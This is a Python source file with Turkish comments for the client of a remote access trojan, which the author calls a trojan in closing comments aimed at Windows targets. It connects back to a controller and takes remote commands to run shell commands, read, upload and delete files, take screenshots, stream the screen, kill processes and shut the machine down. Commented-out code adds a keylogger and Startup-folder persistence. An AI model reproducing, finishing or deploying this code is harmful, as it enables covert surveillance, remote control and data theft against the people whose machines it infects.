import socket
import os
import time
import webbrowser
from colorama import Back, Fore, Style, init
import sys
#from playsound import playsound //burda farklı kütüphane kullanacm
import subprocess
import pyautogui
import shutil
import datetime
import pynput
from pynput.keyboard import Key,Listener
#from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
#ses komutlarını kullanmak için yorum satırını kaldırın(windows için)

"""
def winsound(volume_level):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        ISimpleAudioVolume._iid_, 
        AudioUtilities.CLSCTX_ALL, 
        None)
    volume = interface.QueryInterface(ISimpleAudioVolume)
    volume.SetMasterVolume(volume_level, None)
"""
#=========================================================
#=========================================================
'''
def startklog(power):
    publicyolu="public yolu"
    publicklog="klog yolu"
    if os.path.exists(publicklog):
        os.chdir(publicyolu)
        with open("log.txt","+a")as klog:
            klog.write("---------"+datetime.datetime.today())
    elif not os.path.exists(publicklog):
        os.chdir(publicyolu)
        with open("log.txt")as klog:
            klog.write(" ")
    
    if power=="True":
        
        def tus(key):
            os.chdir(publicyolu)
            try:
                with open("log.txt","a")as klog:
                    klog.write(key.char)
            except:
                with open("log.txt","a")as klog:
                    klog.write(" "+str(key)+" ")
        def kapat():
            pass
        
        with Listener(on_press=tus,on_release=kapat)as listener:
            listener.join()
        
       '''
                
#kalıcılık--------------------------
"""
name=os.path.basename(__file__)
exename=name.replace("py","exe")
os.system(f"copy {exename} \"APPDATA\\Microsoft\\Windows\\Start Menu\\Startup\"")
"""
#kalıcılık-------------------------------






init()
host="127.0.0.1"
ilkdizin=os.getcwd()

def main():
    while True:
        try:
            baglantı = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            baglantı.connect((host, 2505))
            break
        except Exception as e:
            print(e)
            time.sleep(10)

    while True:
#========================================================
        try:
            emir = baglantı.recv(16384).decode("utf-8")
            dizinimiz=os.getcwd()

            if emir == "kapat":
                try:
                    response = "target kapatılıyor"
                    os.system("sudo shutdown now")
                except Exception as e:
                    response=e
                    print(e)
#========================================================
                
            elif emir.startswith("touch"):
                try:
                    oluştur=emir.split()
                    oluştur=oluştur[1]
                    with open(oluştur,"w")as oluşturr:
                        oluşturr.write("")
                    response=f"dosya oluşturuldu dosya adı--{oluştur}"
                except Exception as e:
                    response=e
                    print(e)
#==============================================================
            
            #ses koyup oynatmak dosya adlarının özelleştirilmesi lazım   
            #yada sonradan tüm mp3 lere yaparız.     
            elif emir =="playsound":
                try:
                   # playsound('deneme.mp3')
                    response="deneme sesi başarı ile oynatıldı"
                except Exception as e:
                    response=e
                    print(e)
                    
#===============================================================
            elif emir.startswith("change"):
                try:
                    dosyar=emir.split()   
                    dosyar=dosyar[1]
                    response="lütfen listenerın olduğu dizine dosyanızı koyup [yazdır dosya_adı] yazın"
                except Exception as e:
                    response=e
                    print(e) 
            
#==============================================================
            
            elif emir=="tasklist":
                response=subprocess.check_output('tasklist', encoding='oem')    
    
#===============================================================
            elif emir.startswith("zip"):
                try:
                    
                    zipdosya=emir.split()
                    zipdosya=zipdosya[1]
                    zipyol=dizinimiz+"/"+zipdosya
                    print(zipyol)
                    shutil.make_archive(zipyol, "zip", ilkdizin)
                except Exception as e:
                    response=e
                    print(e)
#==============================================================
                    
                    
            elif emir.startswith("screenshot"):
                try:
                    ekrangoruntusuadı=emir.split()
                    ekrangoruntusuadı=ekrangoruntusuadı[1]
                    screenshot=pyautogui.screenshot()  
                    ssyolu= os.path.join(ilkdizin,ekrangoruntusuadı)  
                    screenshot.save(ssyolu)
                    response="ss alındı"
                except Exception as e:
                    response=e
                    print(e)
#=================================================================
            elif emir.startswith("sender"):
                try:
                    
                    gelendosya_adı=emir.split()
                    gelendosya_adı=gelendosya_adı[1]
                    print("dosya açıldı")
                    with open(gelendosya_adı,"wb")as gelen:
                        time.sleep(2)
                        while True:
                            data=baglantı.recv(16384)
                            if not data:
                                break
                            gelen.write(data)
                            print("dosya yazılıyor")
                    response="dosya gönderildi"        
                except Exception as e:
                    response=e
                    print(e)
#======================================================================
            
            elif emir=="stopscreen":
                screen.stop_stream()
                response="izleme durduruldu"
#====================================================================
            
            elif emir =="screenshare":
                try:
                    from vidstream import ScreenShareClient
                    screen=ScreenShareClient(host,9090)
                    screen.start_stream()    
                    response="bağlantı başarılı" 
                except Exception as e:
                    response=e
#==================================================================
                
            elif emir.startswith("sniff"):
                try:
                    baglantı.settimeout(2)
                    try:
                        göndosya=emir.split(" ",1)
                        göndosya=göndosya[1] 
                        baglantı.send(f"DOSYAGELDİ {göndosya}".encode("utf-8"))
                        with open(göndosya,"rb")as tile:
                            while chunk:= tile.read(16384):
                                if not chunk:
                                    break
                                baglantı.send(chunk)      
                    except Exception as e:
                        response=e
                        print(e)
                    baglantı.send("dosyabittiemmi".encode("utf-8"))
                    print("dosya tamamen bitti")
                    response="denkabey"
                except socket.timeout:
                    break
#===================================================================
            elif emir=="transfertamam":
                response="dosya transfer edildi"         
                  
                    
            elif emir.startswith("PRENSYAZDIR"):
                try:
                    içerrik=emir.split(" ",1) 
                    içerrik=içerrik[1]
                    with open(dosyar,"w") as fıle:
                        fıle.write(içerrik)
                        response="dosya başarılı bir şekilde değiştirildi"
                except Exception as e:
                    response=e
                    print(e)
#========================================================================
                    
            elif emir == "url":
                try:
                 response = "lütfen açmak istediğiniz sayfanın urlsini yapıştırın"
                except Exception as e:
                    response=e
                    print(e)
#==========================================================================
            elif emir.startswith("http"):
                try:
                    
                    webbrowser.open(emir)
                    response = "web sitesi açılıyor"
                except Exception as e:
                    response=e
                    print(e)
#============================================================================
                
            elif emir == "sesfull":
                try:   
                # winsound(1.0)
                    response = "ses fulleniyor"
                except Exception as e:
                    response=e
                    print(e)
                    
#=============================================================================
            elif emir =="pwd":
                try:
                    
                 response=dizinimiz    
                except Exception as e:
                    response=e
                    print(e)
                
#=============================================================================
            elif emir.startswith("cd"):
                try:
                    new_dir=emir.split(" " ,1)[1]    
                    try:
                        os.chdir(new_dir)
                        dizinimiz=os.getcwd()
                        response=f"dizin değiştirildi {dizinimiz}"
                    except  FileNotFoundError:
                        response="dosya yolu bulunamadı"
                    except PermissionError:
                        response="yetkiniz yok"
                except Exception as e:
                    response=e
                    print(e)
#================================================================================
            elif emir =="back":
                try:
                    öncekidizin= os.path.dirname(dizinimiz)     
                    os.chdir(öncekidizin) 
                    dizinimiz=os.getcwd() 
                    response="üst dizine gidildi"
                except FileNotFoundError:
                    response="bir önceki dizin bulunamadı"
                except PermissionError:
                    response="yetkiniz yok"
                except Exception as e:
                    response=e
                    print(e)
#================================================================================
                
            elif emir ==    "nerdeyimben":
                try:
                 response="işte tam olarak burdasın"
                except Exception as e:
                    print(e)
                    response=e
#==============================================================================
                    
            elif emir == "ls":
                try:
                    dosyalar = os.listdir(".")
                    response = "\n".join(dosyalar)
                except Exception as e:
                    response = f"Error listing directory: {e}"
                    
#===============================================================================
            elif emir.startswith("cat"):
                try:
                    dosya_adi = emir.split(" ")[1] if len(emir.split(" ")) > 1 else ""
                    try:
                        with open(dosya_adi, 'r') as f:
                            icerik = f.read()
                        response = f"Dosya içeriği:\n{icerik}"
                    except Exception as e:
                        response = f"Error reading file: {e}"
                except  Exception as e:
                    print(e)
                    response=e
#================================================================================
                       
            elif emir.startswith("rm"):
                try:
                    sildosya=emir.split()
                    sildosya=sildosya[1]
                    os.remove(sildosya)
                    response="dosya başarı ile silindi"
                except Exception as e:
                    print(e)
                    response=e
#==================================================================================
                
             #//tamamlıyamadım   
            elif emir.startswith("open"):
                try:
                    açdosya=emir.split()
                    açdosya=açdosya[1]
                    file_path=os.path.join(dizinimiz, açdosya)
                    print(file_path)
                    subprocess.run([file_path])
                    response="dosya açıldı"
                except Exception as e:
                    print(e)
                    response=e
#=================================================================================
                    
            elif emir == "seskapat":
                try:
                    
                    #winsound(0.0)
                    response = "ses kapatılıyor"
                except Exception as e:
                    print(e)
                    response=e
                
#=================================================================================
            elif emir =="sesfull linux":
                try:
                        
                    os.system("amixer -D pulse sset Master 100%")
                    os.system("amixer -D pulse sset Master unmute")
                    response="ses fulleniyor"
                except Exception as e:
                    print(e)
                    response=e
            
#====================================================================================
            elif emir.startswith("kill"):
                try:
                    kill=emir
                    kill=kill[1]
                    os.system(f'TASKKILL /F /im {kill}')
                    response="işlem öldürüldü"
                except Exception as e:
                    print(e)
                    response=e
#=========================================================================================
            
            elif emir.startswith("mkdir"):
                try:
                    mkdir=emir
                    mkdir=mkdir[1]    
                    os.mkdir(mkdir.encode())    
                    response="klasör oluşturuldu"
                except Exception as e:
                    print(e)
                    response=e
                    
#========================================================================================
            elif emir.startswith("rmdir"):
                try:
                    
                    rmdir=emir
                    rmdir=rmdir[1]
                    shutil.rmtree(rmdir.encode("utf-8"))
                    response="klasör silindi"
                except Exception as e:
                    print(e)
                    response=e
#================================================================================
            elif emir=="terminal":
                response=os.getcwd()      
            
                    
            elif emir =="seskapat linux":
                try:
                    os.system("amixer -D pulse sset Master 0%")
                    os.system("amixer -D pulse sset Master mute")
                    response="ses kapatılıyor"
                except Exception as e:
                    print(e)
                    response=e
#==================================================================================
                    
            elif emir=="startup":
                response=ilkdizin    
                
                
            elif emir == "yardım":
              response="tüm komutlar bunlar"
#===============================================================================    
    
            elif emir.startswith("cmd"):
                cmd=emir
                cmd=cmd[1]
                response=subprocess.check_output(cmd, encoding="oem")
    
#================================================================================                
            elif emir == "":
                try:
                    response="empty command"
                except Exception as e:
                    print(e)
                    response=e
                
                
            else:
                try:
                    print("geçersiz emir")
                    response = "GEÇERSİZ EMİR"
                except Exception as e:
                    print(e)
                    response=e          
                    
                         
            baglantı.send(response.encode("utf-8"))

        except Exception as e:
            os.chdir(ilkdizin)
            print(f"Bir hata oluştu: {e}")
          
            time.sleep(5)  # İsteğe bağlı bekleme süresi
            # Programı yeniden başlat
            try:
               os.execv(sys.executable, [sys.executable] + sys.argv)
            except:
                os.execv(sys.executable, [sys.executable] + sys.argv)




if __name__ == "__main__":
     main()






#1--kodda bi kaç sorun var problem oluşması durumunda kendini yeniden başlatmasını istiyoruz 
#fakat cd komutu bir bug oluşturabiliyo eğerki biz cd komutunu kullanırsak dizin değişir
#dizin değişmesi durumunda ise python kendini dizin içinde bulamıyo bu yüzden buraya düzeltme eklenecek

"""
sorun-2:trojanı linux ortamında denediğim için windows ortamında neler olacağını bilmiyorum 
testlerin çoğunda bir sürü sorun  vardı.
"""
#her ne kadar linuxda deniyorum desemde hedef sistem herzaman windows 
#bu yüzden kodun kalıcılığı açısından STARTUP kullanmayı tercih edicem 
#kod çalıştırıldığında startup klasörüne yerleşmesinide sağlayabilirim fakat-
#hedefim için buna gerek yok. bunun yerine manuel olarak STARTUP a yerleşecem 
#sonrasında kod startupda çalışacak ve bağlantı sağlamaya uğraşacak 
